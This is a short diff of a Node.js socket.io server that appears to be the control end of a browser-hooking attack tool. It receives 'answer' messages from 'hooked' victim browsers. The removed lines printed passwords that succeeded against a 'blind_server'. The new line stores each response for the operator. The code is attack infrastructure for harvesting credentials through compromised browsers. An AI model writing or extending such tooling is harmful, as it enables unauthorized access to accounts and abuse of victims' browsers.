@@ -49,12 +49,13 @@ realtimeListener.on('connection', function (socket) {
     console.log("Hoocked Browser Connected");
   });
 
-  // receives a connect message from a phone
+  // receives an answer message from hooked browser
   socket.on("answer", function (data) {
-    if (data.data.search("Invalid username")==-1){
-      console.log("Answer from blind_server:" + data.passwd);
-      // console.log("Answer from blind_server:" + data.data);
-    }
+    app.updateResponse(data.id, data.data);
+    // if (data.data.search("Invalid username")==-1){
+    //   console.log("DATA from blind_server:" + data.data);
+    //   console.log("ID from blind_server:" + data.id);
+    // }
   });
 });
 
